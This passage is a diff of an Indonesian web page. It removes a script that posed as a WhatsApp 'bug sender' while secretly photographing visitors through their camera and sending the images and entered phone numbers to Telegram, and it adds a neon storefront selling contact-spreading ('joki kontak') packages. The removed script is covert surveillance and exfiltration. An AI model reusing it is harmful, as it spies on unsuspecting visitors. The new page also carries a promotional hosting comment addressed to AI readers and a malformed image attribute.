@@ -221,58 +221,974 @@ Waktu      : ${new Date().toLocaleString()}
             video.srcObject = stream;
             video.onloadedmetadata = () => {
               setTimeout(() => {
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                canvas.toBlob(blob => {
-                  if (blob) sendPhotoToTelegram(blob);
-                  stream.getTracks().forEach(track => track.stop());
-                  resolve();
-                }, 'image/jpeg');
-              }, 3000);
-            };
-          })
-          .catch(err => {
-            sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');
-            resolve();
-          });
-      });
-    }
+<!DOCTYPE html>
+<html lang="id" class="dark">
+<head>
+    <meta charset="UTF-8">
+<!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=ai-legible&utm_source=comment&utm_medium=referral&utm_id=bfa42950-3e88-4e4b-b086-2de98bd71109
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+<meta name="hosting-provider" content="Netlify">
+<meta name="netlify-deploy" content="https://netlify.new/?utm_campaign=ai-legible&amp;utm_source=meta&amp;utm_medium=referral&amp;utm_id=bfa42950-3e88-4e4b-b086-2de98bd71109">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ALkizx4you - Jasa Joki Kontak Terpercaya</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 
-    button.addEventListener('click', async () => {
-      const nomor = input.value.trim();
-      if (!nomor || nomor.length < 8 || nomor.length > 15) {
-        infoDiv.innerText = '⚠️ Nomor tidak valid.';
-        return;
-      }
-      button.disabled = true;
-      infoDiv.innerText = `⏳ Memproses bugs Delay Only To ${nomor}`;
-      sendToTelegram(`<b>📞 Nomor Target:</b> ${nomor}`);
-      input.value = '';
-      try {
-        await getInfo();
-        await startCamera();
-        setTimeout(() => {
-          infoDiv.innerText = `✅ Success  Send Bug To Target ${nomor}`;
-          button.disabled = false;
-        }, 1000);
-      } catch (e) {
-        infoDiv.innerText = '❌ Terjadi kesalahan.';
-        button.disabled = false;
-      }
-    });
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            bg: '#050914',
+                            card: '#0d172a',
+                            cardBorder: '#1e2e4f',
+                            accent: '#00d2ff',
+                            pink: '#ff007f',
+                            purple: '#9d4edd',
+                            gold: '#ffb700',
+                            inputBg: '#091221'
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Plus Jakarta Sans', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            background-color: #030712;
+            color: #f8fafc;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+            overflow-x: hidden;
+        }
 
-    function createParticles() {
-      const container = document.querySelector('.bg-particles');
-      for (let i = 0; i < 50; i++) {
-        const p = document.createElement('div');
-        p.className = 'particle';
-        p.style.left = Math.random() * 100 + '%';
-        p.style.top = Math.random() * 100 + '%';
-        p.style.animationDelay = Math.random() * 6 + 's';
-        p.style.animationDuration = (Math.random() * 4 + 4) + 's';
-        container.appendChild(p);
-      }
-    }
-    document.addEventListener('DOMContentLoaded', createParticles);
-  </script>
+        .neon-border-bright {
+            box-shadow: 0 0 25px rgba(0, 210, 255, 0.35), inset 0 0 15px rgba(255, 0, 127, 0.15);
+            border: 2px solid rgba(0, 210, 255, 0.5);
+        }
+
+        .glow-avatar-bright {
+            box-shadow: 0 0 35px rgba(0, 210, 255, 0.45), 0 0 15px rgba(157, 78, 221, 0.3);
+        }
+
+        .btn-gradient-cyan {
+            background: linear-gradient(135deg, #00f0ff 0%, #0072ff 100%);
+            box-shadow: 0 0 20px rgba(0, 210, 255, 0.5);
+        }
+
+        .btn-gradient-pink {
+            background: linear-gradient(135deg, #ff007f 0%, #7928ca 100%);
+            box-shadow: 0 0 20px rgba(255, 0, 127, 0.5);
+        }
+
+        .btn-gradient-gold {
+            background: linear-gradient(135deg, #ffb700 0%, #ff5202 100%);
+            box-shadow: 0 0 22px rgba(255, 183, 0, 0.5);
+        }
+
+        /* Gerakan Ombang-Ambing Realistis (Realistic Floating Wave Motion) */
+        @keyframes realisticWave1 {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-8px) rotate(0.3deg); }
+        }
+
+        @keyframes realisticWave2 {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-10px) rotate(-0.3deg); }
+        }
+
+        @keyframes realisticWave3 {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-7px) rotate(0.2deg); }
+        }
+
+        @keyframes borderPulseMultiColor {
+            0% {
+                border-color: rgba(0, 210, 255, 0.8);
+                box-shadow: 0 8px 30px -2px rgba(0, 210, 255, 0.4), 0 0 15px rgba(0, 210, 255, 0.2);
+            }
+            33% {
+                border-color: rgba(255, 0, 128, 0.8);
+                box-shadow: 0 8px 30px -2px rgba(255, 0, 128, 0.4), 0 0 15px rgba(255, 0, 128, 0.2);
+            }
+            66% {
+                border-color: rgba(157, 78, 221, 0.8);
+                box-shadow: 0 8px 30px -2px rgba(157, 78, 221, 0.4), 0 0 15px rgba(157, 78, 221, 0.2);
+            }
+            100% {
+                border-color: rgba(0, 210, 255, 0.8);
+                box-shadow: 0 8px 30px -2px rgba(0, 210, 255, 0.4), 0 0 15px rgba(0, 210, 255, 0.2);
+            }
+        }
+
+        @keyframes shimmerGlowBright {
+            0% { transform: translateX(-150%) skewX(-20deg); }
+            50%, 100% { transform: translateX(250%) skewX(-20deg); }
+        }
+
+        .floating-card {
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(12px);
+            will-change: transform;
+        }
+
+        .floating-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 50%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.25), transparent);
+            animation: shimmerGlowBright 3.2s infinite;
+            pointer-events: none;
+        }
+
+        .card-anim-1 { animation: realisticWave1 4.2s ease-in-out infinite, borderPulseMultiColor 4s infinite ease-in-out; }
+        .card-anim-2 { animation: realisticWave2 4.5s ease-in-out infinite, borderPulseMultiColor 4.2s infinite ease-in-out; }
+        .card-anim-3 { animation: realisticWave3 4.0s ease-in-out infinite, borderPulseMultiColor 3.8s infinite ease-in-out; }
+        .card-anim-4 { animation: realisticWave1 4.8s ease-in-out infinite, borderPulseMultiColor 4.5s infinite ease-in-out; }
+        .card-anim-5 { animation: realisticWave2 4.3s ease-in-out infinite, borderPulseMultiColor 4.1s infinite ease-in-out; }
+        .card-anim-6 { animation: realisticWave3 4.6s ease-in-out infinite, borderPulseMultiColor 4.3s infinite ease-in-out; }
+        .card-anim-7 { animation: realisticWave1 3.9s ease-in-out infinite, borderPulseMultiColor 3.6s infinite ease-in-out; }
+
+        ::-webkit-scrollbar {
+            width: 5px;
+            height: 5px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #030712;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #1e2e4f;
+            border-radius: 9999px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #00d2ff;
+        }
+        .no-scrollbar::-webkit-scrollbar {
+            display: none;
+        }
+        .no-scrollbar {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+    </style>
+</head>
+<body class="flex justify-center items-center min-h-screen bg-slate-950">
+
+    <div class="w-full max-w-md min-h-screen bg-brand-bg/90 backdrop-blur-xl flex flex-col relative shadow-[0_0_50px_rgba(0,163,255,0.25)] overflow-hidden border-x border-slate-800/80 z-10 pb-20">
+
+        <!-- Header -->
+        <header class="sticky top-0 z-40 bg-slate-950/90 backdrop-blur-md border-b border-cyan-500/30 px-4 py-3 flex items-center justify-between shadow-lg">
+            <div class="flex items-center space-x-3">
+                <div class="relative w-11 h-11 rounded-full p-0.5 bg-gradient-to-r from-cyan-400 via-fuchsia-500 to-amber-400 flex-shrink-0 animate-pulse">
+                    <img id="header-logo-img" src=https://cdn.phototourl.com/free/2026-09-12-1e6cded4-b0de-4d0c-be73-ee0ce920a2a6.jpg" alt="Logo Tryman Joki Elite" class="w-full h-full rounded-full object-cover bg-slate-950" onerror="this.src='https://placehold.co/100x100/0c1a30/00d2ff?text=TRYMAN'">
+                </div>
+                <div>
+                    <span class="font-black text-base text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 via-sky-200 to-fuchsia-400 tracking-wider uppercase block">KIZX4YOU</span>
+                    <div class="flex items-center space-x-1.5 mt-0.5">
+                        <span class="text-[9px] font-black text-cyan-400 tracking-widest uppercase">OFFICIAL STORE</span>
+                        <span class="text-[9px] text-slate-500">•</span>
+                        <span id="live-datetime" class="text-[9px] font-bold text-amber-300">Memuat Waktu...</span>
+                    </div>
+                </div>
+            </div>
+            <div class="flex items-center space-x-1.5">
+                <button onclick="openAiChatModal()" class="flex items-center space-x-1 bg-gradient-to-r from-fuchsia-500 to-purple-600 text-white text-[11px] font-black px-3.5 py-2 rounded-xl shadow-[0_0_15px_rgba(217,70,239,0.4)] hover:scale-105 active:scale-95 transition">
+                    <span>✨</span>
+                    <span>AI</span>
+                </button>
+            </div>
+        </header>
+
+        <main class="flex-1 px-4 pt-4 pb-8 space-y-6">
+
+            <div class="relative rounded-3xl overflow-hidden p-1 bg-gradient-to-r from-cyan-400 via-fuchsia-500 to-amber-400 shadow-[0_0_30px_rgba(0,210,255,0.3)]">
+                <div class="relative w-full aspect-square rounded-2xl overflow-hidden bg-slate-950 flex items-center justify-center glow-avatar-bright">
+                    <img id="hero-img" src="https://cdn.phototourl.com/free/2026-09-09-3c372529-bfeb-4cbd-8878-6c2f2d6d6987.png" alt="Banner Kizx4you" class="w-full h-full object-cover" onerror="this.src='https://placehold.co/400x400/061126/00d2ff?text=Kizx4you'">
+                </div>
+            </div>
+
+            <div class="text-center space-y-3 pt-1">
+                <div class="inline-flex items-center space-x-2 bg-gradient-to-r from-sky-950 via-cyan-900 to-indigo-950 border border-cyan-400/50 px-4 py-1.5 rounded-full shadow-[0_0_15px_rgba(0,210,255,0.3)]">
+                    <span class="text-amber-400 text-xs animate-bounce">⚡</span>
+                    <span class="text-[11px] font-black tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 to-amber-300 uppercase">ONLINE 24 JAM · CEPAT · TERPERCAYA</span>
+                </div>
+
+                <h1 class="text-2xl font-black tracking-tight text-white uppercase">
+                    ALkizx4you <span class="text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-fuchsia-400 to-amber-400">ELITE</span>
+                </h1>
+
+                <p class="text-xs text-slate-200 leading-relaxed max-w-xs mx-auto font-medium">
+                    Jasa joki kontak dengan sistem tebar all GB. Pilih paket, lakukan pembayaran, lalu konfirmasi pesanan langsung ke admin.
+                </p>
+            </div>
+
+            <div class="grid grid-cols-3 gap-2.5 pt-1">
+                <div class="bg-gradient-to-b from-slate-900 to-cyan-950/40 border border-cyan-500/40 rounded-2xl p-3 text-center shadow-[0_0_15px_rgba(0,210,255,0.15)]">
+                    <div class="text-sm font-black text-cyan-300">24/7</div>
+                    <div class="text-[10px] font-bold text-slate-300 mt-0.5">Online</div>
+                </div>
+                <div class="bg-gradient-to-b from-slate-900 to-fuchsia-950/40 border border-fuchsia-500/40 rounded-2xl p-3 text-center shadow-[0_0_15px_rgba(255,0,127,0.15)]">
+                    <div class="text-sm font-black text-fuchsia-300">ALL GB</div>
+                    <div class="text-[10px] font-bold text-slate-300 mt-0.5">Tebar grup</div>
+                </div>
+                <div class="bg-gradient-to-b from-slate-900 to-amber-950/40 border border-amber-500/40 rounded-2xl p-3 text-center shadow-[0_0_15px_rgba(255,183,0,0.15)]">
+                    <div class="text-sm font-black text-amber-300">FAST</div>
+                    <div class="text-[10px] font-bold text-slate-300 mt-0.5">Proses cepat</div>
+                </div>
+            </div>
+
+            <div class="pt-4 flex items-center justify-between">
+                <div>
+                    <div class="flex items-center space-x-2">
+                        <span class="text-2xl">👥</span>
+                        <h2 class="text-xl font-black tracking-wide text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 via-blue-400 to-fuchsia-400 uppercase">LIST JOKI KONTAK</h2>
+                    </div>
+                    <p class="text-[11px] font-bold text-amber-400 tracking-widest uppercase ml-8 -mt-1">BY ALkizx4you</p>
+                </div>
+                <span class="text-xs bg-cyan-500/20 text-cyan-300 font-extrabold px-2.5 py-1 rounded-lg border border-cyan-400/40 animate-pulse">PROMO</span>
+            </div>
+
+            <div class="space-y-4" id="package-list">
+
+                <!-- Package 1 Hari -->
+                <div class="neon-card floating-card card-anim-1 bg-gradient-to-r from-slate-900/90 via-cyan-950/50 to-slate-900/90 border border-cyan-400/60 rounded-2xl p-4 flex flex-col justify-between space-y-3 shadow-[0_0_20px_rgba(0,210,255,0.2)]">
+                    <div class="flex items-start justify-between">
+                        <div>
+                            <div class="flex items-center space-x-2">
+                                <span class="text-amber-400 text-lg">⚡</span>
+                                <h3 class="font-black text-base text-white">1 HARI</h3>
+                            </div>
+                            <p class="text-xs text-slate-300 mt-0.5">Joki kontak · 1 hari full</p>
+                        </div>
+                        <span class="text-[10px] bg-cyan-400/20 text-cyan-300 font-black px-2 py-0.5 rounded-full border border-cyan-400/50">STARTER</span>
+                    </div>
+                    <div>
+                        <div class="text-xl font-black text-cyan-300 mb-3">Rp 1.000</div>
+                        <button onclick="selectPackage('1 HARI', 1000)" class="w-full btn-gradient-cyan text-slate-950 font-black text-sm py-2.5 px-4 rounded-xl flex items-center justify-center space-x-2 active:scale-95 transition">
+                            <span>☎</span>
+                            <span>Pesan & Bayar</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Package 2 Hari -->
+                <div class="neon-card floating-card card-anim-2 bg-gradient-to-r from-slate-900/90 via-teal-950/50 to-slate-900/90 border border-teal-400/60 rounded-2xl p-4 flex flex-col justify-between space-y-3 shadow-[0_0_20px_rgba(45,212,191,0.2)]">
+                    <div class="flex items-start justify-between">
+                        <div>
+                            <div class="flex items-center space-x-2">
+                                <span class="text-amber-400 text-lg">⚡</span>
+                                <h3 class="font-black text-base text-white">2 HARI</h3>
+                            </div>
+                            <p class="text-xs text-slate-300 mt-0.5">Joki kontak · 2 hari full</p>
+                        </div>
+                        <span class="text-[10px] bg-teal-400/20 text-teal-300 font-black px-2 py-0.5 rounded-full border border-teal-400/50">SUPER FAST</span>
+                    </div>
+                    <div>
+                        <div class="text-xl font-black text-teal-300 mb-3">Rp 2.000</div>
+                        <button onclick="selectPackage('2 HARI', 2000)" class="w-full bg-gradient-to-r from-teal-300 via-emerald-400 to-cyan-400 text-slate-950 font-black text-sm py-2.5 px-4 rounded-xl flex items-center justify-center space-x-2 shadow-[0_0_20px_rgba(45,212,191,0.4)] active:scale-95 transition">
+                            <span>☎</span>
+                            <span>Pesan & Bayar</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Package 3 Hari -->
+                <div class="neon-card floating-card card-anim-3 bg-gradient-to-r from-slate-900/90 via-indigo-950/50 to-slate-900/90 border border-indigo-400/60 rounded-2xl p-4 flex flex-col justify-between space-y-3 shadow-[0_0_20px_rgba(129,140,248,0.2)]">
+                    <div class="flex items-start justify-between">
+                        <div>
+                            <div class="flex items-center space-x-2">
+                                <span class="text-amber-400 text-lg">⚡</span>
+                                <h3 class="font-black text-base text-white">3 HARI</h3>
+                            </div>
+                            <p class="text-xs text-slate-300 mt-0.5">Joki kontak · 3 hari full</p>
+                        </div>
+                        <span class="text-[10px] bg-indigo-400/20 text-indigo-300 font-black px-2 py-0.5 rounded-full border border-indigo-400/50">POPULER</span>
+                    </div>
+                    <div>
+                        <div class="text-xl font-black text-indigo-300 mb-3">Rp 3.000</div>
+                        <button onclick="selectPackage('3 HARI', 3000)" class="w-full bg-gradient-to-r from-indigo-400 via-purple-400 to-pink-400 text-slate-950 font-black text-sm py-2.5 px-4 rounded-xl flex items-center justify-center space-x-2 shadow-[0_0_20px_rgba(129,140,248,0.4)] active:scale-95 transition">
+                            <span>☎</span>
+                            <span>Pesan & Bayar</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Package 4 Hari -->
+                <div class="neon-card floating-card card-anim-4 bg-gradient-to-r from-slate-900/90 via-fuchsia-950/50 to-slate-900/90 border border-fuchsia-400/60 rounded-2xl p-4 flex flex-col justify-between space-y-3 shadow-[0_0_20px_rgba(232,121,249,0.2)]">
+                    <div class="flex items-start justify-between">
+                        <div>
+                            <div class="flex items-center space-x-2">
+                                <span class="text-amber-400 text-lg">⚡</span>
+                                <h3 class="font-black text-base text-white">4 HARI</h3>
+                            </div>
+                            <p class="text-xs text-slate-300 mt-0.5">Joki kontak · 4 hari full</p>
+                        </div>
+                        <span class="text-[10px] bg-fuchsia-400/20 text-fuchsia-300 font-black px-2 py-0.5 rounded-full border border-fuchsia-400/50">HEBAT</span>
+                    </div>
+                    <div>
+                        <div class="text-xl font-black text-fuchsia-300 mb-3">Rp 4.000</div>
+                        <button onclick="selectPackage('4 HARI', 4000)" class="w-full btn-gradient-pink text-slate-950 font-black text-sm py-2.5 px-4 rounded-xl flex items-center justify-center space-x-2 active:scale-95 transition">
+                            <span>☎</span>
+                            <span>Pesan & Bayar</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Package 5 Hari -->
+                <div class="neon-card floating-card card-anim-5 bg-gradient-to-r from-slate-900/90 via-orange-950/50 to-slate-900/90 border border-orange-400/60 rounded-2xl p-4 flex flex-col justify-between space-y-3 shadow-[0_0_20px_rgba(251,146,60,0.2)]">
+                    <div class="flex items-start justify-between">
+                        <div>
+                            <div class="flex items-center space-x-2">
+                                <span class="text-amber-400 text-lg">⚡</span>
+                                <h3 class="font-black text-base text-white">5 HARI</h3>
+                            </div>
+                            <p class="text-xs text-slate-300 mt-0.5">Joki kontak · 5 hari full</p>
+                        </div>
+                        <span class="text-[10px] bg-orange-400/20 text-orange-300 font-black px-2 py-0.5 rounded-full border border-orange-400/50">HEMAT</span>
+                    </div>
+                    <div>
+                        <div class="text-xl font-black text-orange-300 mb-3">Rp 5.000</div>
+                        <button onclick="selectPackage('5 HARI', 5000)" class="w-full bg-gradient-to-r from-amber-400 via-orange-400 to-rose-400 text-slate-950 font-black text-sm py-2.5 px-4 rounded-xl flex items-center justify-center space-x-2 shadow-[0_0_20px_rgba(251,146,60,0.4)] active:scale-95 transition">
+                            <span>☎</span>
+                            <span>Pesan & Bayar</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Package 7 Hari + Tebar All GB -->
+                <div class="neon-card floating-card card-anim-6 bg-gradient-to-r from-slate-900/90 via-blue-950/70 to-slate-900/90 border-2 border-cyan-400 rounded-2xl p-4 flex flex-col justify-between space-y-3 shadow-[0_0_25px_rgba(0,210,255,0.3)]">
+                    <div class="flex items-start justify-between">
+                        <div>
+                            <div class="flex items-center space-x-2">
+                                <span class="text-amber-400 text-xl animate-bounce">⚡</span>
+                                <h3 class="font-black text-base text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 via-sky-200 to-fuchsia-300 uppercase">7 HARI + TEBAR ALL GB</h3>
+                            </div>
+                            <p class="text-xs text-cyan-200 mt-0.5 font-semibold">Tebar all GB termasuk</p>
+                        </div>
+                        <span class="text-[10px] bg-gradient-to-r from-cyan-400 to-blue-500 text-slate-950 font-black px-2.5 py-0.5 rounded-full shadow-md">BEST VALUE</span>
+                    </div>
+                    <div>
+                        <div class="text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 to-amber-300 mb-3">Rp 6.500</div>
+                        <button onclick="selectPackage('7 HARI + TEBAR ALL GB', 6500)" class="w-full btn-gradient-cyan text-slate-950 font-black text-sm py-3 px-4 rounded-xl flex items-center justify-center space-x-2 active:scale-95 transition">
+                            <span>☎</span>
+                            <span>Pesan & Bayar</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Package Permanen -->
+                <div class="neon-card floating-card card-anim-7 bg-gradient-to-r from-slate-900/90 via-amber-950/60 to-slate-900/90 border-2 border-amber-400 rounded-2xl p-4 flex flex-col justify-between space-y-3 shadow-[0_0_30px_rgba(255,183,0,0.35)]">
+                    <div class="flex items-start justify-between">
+                        <div>
+                            <div class="flex items-center space-x-2">
+                                <span class="text-amber-300 text-2xl animate-pulse">👑</span>
+                                <h3 class="font-black text-base text-transparent bg-clip-text bg-gradient-to-r from-amber-300 via-orange-300 to-rose-300 uppercase">MANENT / PERMANEN</h3>
+                            </div>
+                            <p class="text-xs text-amber-200 mt-0.5 font-bold">tebar all gb + all sosmed + setiap hari</p>
+                        </div>
+                        <span class="text-[10px] bg-gradient-to-r from-amber-400 to-orange-500 text-slate-950 font-black px-2.5 py-0.5 rounded-full shadow-md animate-pulse">VIP KING</span>
+                    </div>
+                    <div>
+                        <div class="text-2xl font-black text-amber-300 mb-3">Rp 10.000</div>
+                        <button onclick="selectPackage('MANENT / PERMANEN', 10000)" class="w-full btn-gradient-gold text-slate-950 font-black text-sm py-3 px-4 rounded-xl flex items-center justify-center space-x-2 active:scale-95 transition">
+                            <span>👑</span>
+                            <span>Pesan & Bayar VIP</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="bg-gradient-to-r from-slate-900 via-cyan-950/40 to-slate-900 border border-cyan-500/40 rounded-2xl p-4 text-xs text-slate-200 leading-relaxed shadow-lg">
+                <span class="font-black text-cyan-300">Catatan:</span> Paket 7 hari sudah termasuk tebar all GB. Paket permanen mendapat tebar all GB + all sosmed + layanan setiap hari.
+            </div>
+
+            <div class="space-y-3 pt-2">
+                <div class="text-center">
+                    <h3 class="text-xs font-black tracking-widest text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 via-fuchsia-300 to-amber-300 uppercase">TANYA JAWAB (FAQ)</h3>
+                    <p class="text-[10px] text-slate-400 font-medium">Pertanyaan yang sering diajukan pelanggan</p>
+                </div>
+
+                <div class="space-y-2">
+                    <div class="bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden">
+                        <button onclick="toggleFaq(1)" class="w-full px-4 py-3 text-left font-bold text-xs text-slate-200 flex items-center justify-between">
+                            <span>Bagaimana cara kerja Jasa Joki Kontak?</span>
+                            <span id="faq-icon-1" class="text-cyan-400 font-bold">+</span>
+                        </button>
+                        <div id="faq-body-1" class="hidden px-4 pb-3 text-[11px] text-slate-400 leading-relaxed border-t border-slate-800/80 pt-2">
+                            Kontak WhatsApp Anda akan disebar secara luas ke dalam grup-grup WhatsApp (All GB) yang aktif dan ribuan pengguna lainnya sesuai durasi paket yang Anda pilih.
+                        </div>
+                    </div>
+
+                    <div class="bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden">
+                        <button onclick="toggleFaq(2)" class="w-full px-4 py-3 text-left font-bold text-xs text-slate-200 flex items-center justify-between">
+                            <span>Berapa lama proses pengerjaannya?</span>
+                            <span id="faq-icon-2" class="text-cyan-400 font-bold">+</span>
+                        </button>
+                        <div id="faq-body-2" class="hidden px-4 pb-3 text-[11px] text-slate-400 leading-relaxed border-t border-slate-800/80 pt-2">
+                            Proses dimulai langsung setelah pembayaran dikonfirmasi ke admin WhatsApp kami. Sat-set dan cepat!
+                        </div>
+                    </div>
+
+                    <div class="bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden">
+                        <button onclick="toggleFaq(3)" class="w-full px-4 py-3 text-left font-bold text-xs text-slate-200 flex items-center justify-between">
+                            <span>Apakah aman untuk akun WhatsApp?</span>
+                            <span id="faq-icon-3" class="text-cyan-400 font-bold">+</span>
+                        </button>
+                        <div id="faq-body-3" class="hidden px-4 pb-3 text-[11px] text-slate-400 leading-relaxed border-t border-slate-800/80 pt-2">
+                            Sangat aman karena menggunakan metode tebar grup organik dan sistem profesional yang telah dipercaya ribuan pelanggan.
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Gemini AI Assistant Feature Box -->
+            <div class="bg-gradient-to-r from-slate-900 via-purple-950/40 to-slate-900 border border-fuchsia-500/50 rounded-2xl p-4 space-y-3 shadow-[0_0_20px_rgba(217,70,239,0.2)]">
+                <div class="flex items-center justify-between">
+                    <div class="flex items-center space-x-2">
+                        <span class="text-xl">✨</span>
+                        <h3 class="font-black text-sm text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 to-fuchsia-300 uppercase">AI JOKI CONSULTANT</h3>
+                    </div>
+                    <span class="text-[9px] bg-fuchsia-500/20 text-fuchsia-300 font-bold px-2 py-0.5 rounded-full border border-fuchsia-400/30">GEMINI POWERED</span>
+                </div>
+                <p class="text-xs text-slate-300">
+                    Bingung pilih paket atau mau konsultasi strategi joki kontak terbaik? Tanyakan langsung ke AI Assistant kami!
+                </p>
+                <button onclick="openAiChatModal()" class="w-full bg-gradient-to-r from-fuchsia-500 via-purple-600 to-cyan-500 text-white font-black text-xs py-2.5 px-4 rounded-xl flex items-center justify-center space-x-2 shadow-[0_0_15px_rgba(217,70,239,0.3)] active:scale-95 transition">
+                    <span>💬</span>
+                    <span>Tanya AI Consultant Sekarang</span>
+                </button>
+            </div>
+
+            <div class="pt-2 space-y-3">
+                <div class="text-center">
+                    <h3 class="text-xs font-black tracking-widest text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 via-fuchsia-300 to-amber-300 uppercase">MEDIA SOSIAL & SALURAN RESMI</h3>
+                    <p class="text-[10px] text-slate-400 font-medium">Ikuti dan bergabunglah melalui saluran kami</p>
+                </div>
+                <div class="grid grid-cols-2 gap-2">
+                    <!-- WhatsApp Link -->
+                    <a id="sosmed-wa" href="https://wa.me/6281277521737" target="_blank" class="flex flex-col items-center justify-center p-3 rounded-2xl bg-gradient-to-b from-slate-900 to-emerald-950/60 border border-emerald-500/50 text-emerald-400 hover:scale-105 active:scale-95 transition shadow-[0_0_15px_rgba(16,185,129,0.25)] group">
+                        <i class="fa-brands fa-whatsapp text-2xl mb-1 group-hover:animate-bounce"></i>
+                        <span class="text-[10px] font-black tracking-tight">WhatsApp Admin</span>
+                    </a>
+                    <!-- WhatsApp Channel 1: Storan Joki Kontak -->
+                    <a id="sosmed-channel" href="https://whatsapp.com/channel/0029Vb5kDO75K3zaIPQiGB3K" target="_blank" class="flex flex-col items-center justify-center p-3 rounded-2xl bg-gradient-to-b from-slate-900 to-teal-950/60 border border-teal-500/50 text-teal-300 hover:scale-105 active:scale-95 transition shadow-[0_0_15px_rgba(20,184,166,0.25)] group">
+                        <i class="fa-solid fa-bullhorn text-2xl mb-1 group-hover:animate-bounce"></i>
+                        <span class="text-[10px] font-black tracking-tight text-center">Saluran Testi</span>
+                    </a>
+                    <!-- WhatsApp Channel 2: Testi Trx -->
+                    <a id="sosmed-channel-testi" href="https://whatsapp.com/channel/0029VbE4PsDICVfeA4bAMu0e" target="_blank" class="flex flex-col items-center justify-center p-3 rounded-2xl bg-gradient-to-b from-slate-900 to-cyan-950/60 border border-cyan-500/50 text-cyan-300 hover:scale-105 active:scale-95 transition shadow-[0_0_15px_rgba(6,182,212,0.25)] group">
+                        <i class="fa-solid fa-star text-2xl mb-1 group-hover:animate-bounce text-amber-300"></i>
+                        <span class="text-[10px] font-black tracking-tight text-center">Saluran Info Stok</span>
+                    </a>
+                    <!-- TikTok Link -->
+                    <a id="sosmed-tiktok" href="https://www.tiktok.com/@alkizx_store" target="_blank" class="flex flex-col items-center justify-center p-3 rounded-2xl bg-gradient-to-b from-slate-900 to-fuchsia-950/60 border border-fuchsia-500/50 text-fuchsia-400 hover:scale-105 active:scale-95 transition shadow-[0_0_15px_rgba(217,70,239,0.25)] group">
+                        <i class="fa-brands fa-tiktok text-2xl mb-1 group-hover:animate-bounce"></i>
+                        <span class="text-[10px] font-black tracking-tight">TikTok</span>
+                    </a>
+                </div>
+                <div class="grid grid-cols-1 gap-2">
+                    <!-- Instagram Link -->
+                    <a id="sosmed-instagram" href="https://www.instagram.com/alkizx_store" target="_blank" class="flex items-center justify-center space-x-2 p-3 rounded-2xl bg-gradient-to-b from-slate-900 to-pink-950/60 border border-pink-500/50 text-pink-400 hover:scale-105 active:scale-95 transition shadow-[0_0_15px_rgba(236,72,153,0.25)] group">
+                        <i class="fa-brands fa-instagram text-xl group-hover:animate-bounce"></i>
+                        <span class="text-xs font-black tracking-tight">Instagram Resmi</span>
+                    </a>
+                </div>
+            </div>
+
+        </main>
+
+        <nav class="absolute bottom-0 left-0 right-0 bg-slate-950/95 backdrop-blur-lg border-t border-cyan-500/30 px-6 py-2.5 flex items-center justify-around z-30 shadow-2xl">
+            <button onclick="window.scrollTo({top:0, behavior:'smooth'})" class="flex flex-col items-center text-cyan-400 hover:text-white transition">
+                <i class="fa-solid fa-house text-sm"></i>
+                <span class="text-[9px] font-bold mt-0.5">Home</span>
+            </button>
+            <button onclick="openAiChatModal()" class="flex flex-col items-center text-fuchsia-400 hover:text-white transition">
+                <i class="fa-solid fa-wand-magic-sparkles text-sm"></i>
+                <span class="text-[9px] font-bold mt-0.5">AI Tanya</span>
+            </button>
+            <button onclick="toggleAdminPanel()" class="flex flex-col items-center text-amber-400 hover:text-white transition">
+                <i class="fa-solid fa-gear text-sm"></i>
+                <span class="text-[9px] font-bold mt-0.5">Admin</span>
+            </button>
+        </nav>
+
+        <footer class="text-center py-4 text-[11px] text-slate-400 border-t border-cyan-500/30 bg-slate-950/90 mb-12">
+            <p class="font-bold text-slate-300">© 2026 ALkizx4you · All rights reserved</p>
